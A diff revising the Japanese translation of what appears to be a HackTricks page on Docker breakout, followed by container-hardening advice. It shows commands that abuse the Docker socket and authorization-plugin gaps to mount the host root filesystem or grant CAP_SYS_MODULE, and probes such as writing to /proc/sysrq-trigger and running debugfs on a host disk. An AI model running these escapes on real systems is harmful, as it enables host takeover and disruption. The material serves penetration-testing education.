-システム管理者がDockerファイアウォールを設定する際に、API（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)）の重要なパラメーターである「**Binds**」を忘れてしまった可能性があります。\
-以下の例では、この設定ミスを悪用して、ホストのルート（/）フォルダをマウントするコンテナを作成して実行することが可能です：
+sysadminがdockerのファイアウォールを設定した際に、APIの重要なパラメータ（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)）の一つである"**Binds**"を**忘れている**可能性があります。
+以下の例では、この設定ミスを悪用して、ホストのルート(/)フォルダをマウントするコンテナを作成し実行することができます：
 ```bash
 docker version #First, find the API version of docker, 1.40 in this example
 docker images #List the images available
@@ -443,7 +445,7 @@ docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
 ```
 ## チェックされていないJSON属性
 
-システム管理者がDockerファイアウォールを設定する際に、API（[https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList)）のパラメータの中にある「**Capabilities**」のような重要な属性を**忘れてしまった**可能性があります。次の例では、この設定ミスを悪用して、**SYS_MODULE**の機能を持つコンテナを作成して実行することができます。
+sysadminがdockerファイアウォールを設定した際に、API([https://docs.docker.com/engine/api/v1.40/#operation/ContainerList](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList))のパラメーターの重要な属性を**忘れてしまった**可能性があります。例えば、"**HostConfig**"内の"**Capabilities**"がそれにあたります。以下の例では、この誤設定を悪用して、**SYS_MODULE**機能を持つコンテナを作成し実行することが可能です：
 ```bash
 docker version
 curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
@@ -453,9 +455,9 @@ docker exec -it c52a77629a91 bash
 capsh --print
 #You can abuse the SYS_MODULE capability
 ```
-# Writable hostPath マウント
+# 書き込み可能なhostPathマウント
 
-（[**こちら**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)からの情報）コンテナ内では、攻撃者はクラスタによって作成された書き込み可能な hostPath ボリュームを介して、基礎となるホスト OS へのさらなるアクセスを試みることがあります。以下は、この攻撃ベクトルを利用しているかどうかを確認するために、コンテナ内でチェックできる一般的な事項です。
+([**こちら**](https://medium.com/swlh/kubernetes-attack-path-part-2-post-initial-access-1e27aabda36d)からの情報) コンテナ内で、攻撃者はクラスターによって作成された書き込み可能なhostPathボリュームを介して基盤となるホストOSへのさらなるアクセスを試みることがあります。以下は、この攻撃ベクトルを利用できるかどうかをコンテナ内で確認できる一般的な項目です：
 ```bash
 ### Check if You Can Write to a File-system
 $ echo 1 > /proc/sysrq-trigger
@@ -469,27 +471,27 @@ $ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if n
 ### debugfs (Interactive File System Debugger)
 $ debugfs /dev/sda1
 ```
-# コンテナのセキュリティ改善
+# コンテナのセキュリティ向上
 
-## DockerにおけるSeccomp
+## DockerのSeccomp
 
-これはDockerコンテナからの脱出ではなく、Dockerが使用するセキュリティ機能です。Dockerからの脱出を防ぐ可能性があるため、知っておくべきです。
+これはDockerコンテナから脱出する技術ではありませんが、Dockerが使用しているセキュリティ機能であり、Dockerからの脱出を防ぐ可能性があるため、知っておくべきです：
 
 {% content-ref url="seccomp.md" %}
 [seccomp.md](seccomp.md)
 {% endcontent-ref %}
 
-## DockerにおけるAppArmor
+## DockerのAppArmor
 
-これはDockerコンテナからの脱出ではなく、Dockerが使用するセキュリティ機能です。Dockerからの脱出を防ぐ可能性があるため、知っておくべきです。
+これはDockerコンテナから脱出する技術ではありませんが、Dockerが使用しているセキュリティ機能であり、Dockerからの脱出を防ぐ可能性があるため、知っておくべきです：
 
 {% content-ref url="apparmor.md" %}
 [apparmor.md](apparmor.md)
 {% endcontent-ref %}
 
-## 認証と認可
+## AuthZ & AuthN
 
-認証プラグインは、現在の認証コンテキストとコマンドコンテキストの両方に基づいて、Dockerデーモンへのリクエストを承認または拒否します。認証コンテキストにはすべてのユーザーの詳細と認証方法が含まれます。コマンドコンテキストには、関連するリクエストデータが含まれます。
+認証プラグインは、現在の**認証**コンテキストと**コマンド**コンテキストの両方に基づいて、Docker **デーモン**への**リクエスト**を**承認**または**拒否**します。**認証**コンテキストには、すべての**ユーザー詳細**と**認証**方法が含まれています。**コマンドコンテキスト**には、すべての関連する**リクエスト**データが含まれています。
 
 {% content-ref url="broken-reference" %}
 [リンク切れ](broken-reference)
@@ -497,30 +499,30 @@ $ debugfs /dev/sda1
 
 ## gVisor
 
-**gVisor**は、Goで書かれたアプリケーションカーネルであり、Linuxシステムの大部分を実装しています。これには、[Open Container Initiative (OCI)](https://www.opencontainers.org)のランタイムである`runsc`が含まれており、アプリケーションとホストカーネルの間に**分離境界**を提供します。`runsc`ランタイムはDockerとKubernetesと統合されており、サンドボックス化されたコンテナを簡単に実行できます。
+**gVisor**はGoで書かれたアプリケーションカーネルで、Linuxシステムの大部分を実装しています。これには、アプリケーションとホストカーネルの間の**分離境界**を提供する[Open Container Initiative (OCI)](https://www.opencontainers.org)ランタイムの`runsc`が含まれています。`runsc`ランタイムはDockerとKubernetesと統合されており、サンドボックス化されたコンテナを簡単に実行できます。
 
 {% embed url="https://github.com/google/gvisor" %}
 
 # Kata Containers
 
-**Kata Containers**は、軽量な仮想マシンを使用してコンテナのように感じ、パフォーマンスを提供しながら、**ハードウェア仮想化**技術を使用してより強力なワークロードの分離を実現するために取り組んでいるオープンソースコミュニティです。
+**Kata Containers**は、コンテナのように感じられ、コンテナのように動作するが、ハードウェア仮想化技術を使用して**より強力なワークロードの分離**を提供する、軽量な仮想マシンを構築するために取り組んでいるオープンソースコミュニティです。
 
 {% embed url="https://katacontainers.io/" %}
 
 ## 安全にコンテナを使用する
 
-Dockerはデフォルトでコンテナを制限しています。これらの制限を緩めるとセキュリティ上の問題が発生する可能性があります。`--privileged`フラグの完全な権限を持たなくても、権限を制限することが重要です。
+Dockerはデフォルトでコンテナを制限し、制約をかけています。これらの制限を緩めることは、`--privileged`フラグの完全な権限なしでも、セキュリティ問題を引き起こす可能性があります。追加される各権限の影響を認識し、必要最小限に権限を制限することが重要です。
 
-コンテナを安全に保つためには、次のことに注意してください：
+コンテナを安全に保つために：
 
-* `--privileged`フラグを使用せず、[コンテナ内にDockerソケットをマウントしないでください](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)。Dockerソケットはコンテナの生成を可能にするため、`--privileged`フラグを使用して別のコンテナを実行するなど、ホストの完全な制御を簡単に取得する方法です。
-* コンテナ内でrootとして実行しないでください。[異なるユーザー](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)または[ユーザーネームスペース](https://docs.docker.com/engine/security/userns-remap/)を使用してください。コンテナ内のrootは、ユーザーネームスペースでリマップされない限り、ホストと同じです。主にLinuxのネームスペース、機能、およびcgroupsによって制限されています。
-* [すべての機能をドロップ](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)（`--cap-drop=all`）し、必要な機能のみを有効にしてください（`--cap-add=...`）。多くのワークロードでは機能は必要ありませんし、それらを追加することで攻撃の範囲が広がります。
-* [「no-new-privileges」セキュリティオプションを使用](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)して、プロセスが特権を取得するのを防止してください。たとえば、suidバイナリを介して特権を取得することがあります。
-* [コンテナに利用可能なリソースを制限](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)してください。リソース制限は、サービス拒否攻撃からマシンを保護することができます。
-* [seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（またはSELinux）プロファイルを調整して、コンテナで使用可能なアクションとシスコールを最小限に制限してください。
-* [公式のDockerイメージ](https://docs.docker.com/docker-hub/official_images/)を使用するか、それらを基に独自のイメージをビルドしてください。[バックドアが仕込まれた](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/)イメージを継承または使用しないでください。
-* セキュリティパッチを適用するために定期的にイメージを再ビルドしてください。これは当然のことです。
+* `--privileged`フラグを使用しないでください。また、[Dockerソケットをコンテナ内にマウント](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/)しないでください。Dockerソケットはコンテナの生成を可能にするため、例えば`--privileged`フラグを使用して別のコンテナを実行することで、ホストを完全に制御する簡単な方法です。
+* コンテナ内でrootとして実行しないでください。[異なるユーザー](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user)を使用するか、[ユーザーネームスペース](https://docs.docker.com/engine/security/userns-remap/)を使用してください。コンテナのrootは、ユーザーネームスペースでリマップされていない限り、ホスト上のrootと同じです。主にLinuxのネームスペース、機能、およびcgroupsによって軽く制限されています。
+* [すべての機能をドロップ](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities)（`--cap-drop=all`）し、必要なもののみを有効にします（`--cap-add=...`）。多くのワークロードはいかなる機能も必要とせず、それらを追加することは潜在的な攻撃の範囲を広げます。
+* [“no-new-privileges”セキュリティオプションを使用](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)して、例えばsuidバイナリを通じて、プロセスがより多くの権限を得ることを防ぎます。
+* [コンテナに利用可能なリソースを制限](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)します。リソースの制限は、サービス拒否攻撃からマシンを保護することができます。
+* 必要最小限にコンテナのアクションとシステムコールを制限するために、[seccomp](https://docs.docker.com/engine/security/seccomp/)、[AppArmor](https://docs.docker.com/engine/security/apparmor/)（またはSELinux）プロファイルを調整します。
+* [公式のdockerイメージ](https://docs.docker.com/docker-hub/official_images/)を使用するか、それらに基づいて自分のイメージを構築してください。[バックドア](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/)が仕掛けられたイメージを継承したり使用したりしないでください。
+* 定期的にイメージを再構築してセキュリティパッチを適用してください。これは言うまでもありません。
 
 # 参考文献
 
@@ -531,14 +533,14 @@ Dockerはデフォルトでコンテナを制限しています。これらの�
 
 <details>
 
-<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)でAWSハッキングをゼロからヒーローまで学ぶ</strong></summary>
 
-- **サイバーセキュリティ企業で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンやHackTricksのPDFをダウンロードしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！**
+HackTricksをサポートする他の方法：
 
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
+* **HackTricksにあなたの**会社を広告したい、または**HackTricksをPDFでダウンロード**したい場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
+* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見してください。私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションです。
+* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**telegramグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で**フォロー**してください。
+* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有**してください。
 
-- [**公式のPEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
-
-- [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**をフォローしてください。**
-
-- **ハッキングのトリックを共有するには、[hacktricksリポジトリ](https://github.com/carlospolop/hacktr
+</details>
